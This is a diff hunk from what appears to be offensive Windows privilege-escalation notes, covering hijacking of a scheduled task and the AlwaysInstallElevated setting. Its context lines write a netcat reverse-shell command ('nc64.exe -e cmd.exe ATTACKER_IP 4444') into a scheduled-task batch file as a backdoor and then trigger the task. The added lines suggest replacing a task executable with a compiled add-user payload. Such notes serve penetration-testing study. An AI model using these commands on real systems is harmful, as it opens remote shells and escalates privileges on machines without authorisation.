@@ -31,6 +31,8 @@
     //if yes we can modify it as a backdoor,
     echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
     schtasks /run /tn vulntask  //run immediately
+    If the ran task is a .exe file, refer to Service hijacking to reaplce a complied adduser payload file.
+    
   
   #### AlwaysInstallElevated  
     msi files can be configured to run with higher privileges from any user account (even unprivileged ones)
